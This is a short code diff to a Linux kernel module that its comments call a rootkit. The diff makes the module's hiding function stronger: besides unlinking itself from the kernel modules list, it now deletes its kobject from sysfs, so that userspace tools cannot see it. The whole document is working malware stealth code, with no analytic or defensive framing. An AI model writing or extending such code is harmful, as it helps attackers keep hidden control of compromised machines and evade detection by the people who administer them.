@@ -1,4 +1,5 @@
 #include <linux/module.h>
+#include <linux/kobject.h>
 #include <linux/types.h>
 #include <linux/dirent.h>
 #include <linux/kstrtox.h>
@@ -15,12 +16,17 @@
 bool rooti_hidden = false;
 static struct list_head *prev_module = NULL;
 
-// Hides this rootkit by removing it from the kernel modules list.
+/*
+    Hides the rootkit from userspace by removing it from the kernel modules list
+    and deleting its kobject from the syfs hierarchy.
+*/
 void rooti_hideme()
 {
     rooti_hidden = true;
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    
 }
 
 // Reveals this rootkit by re-adding it to the kernel modules list.
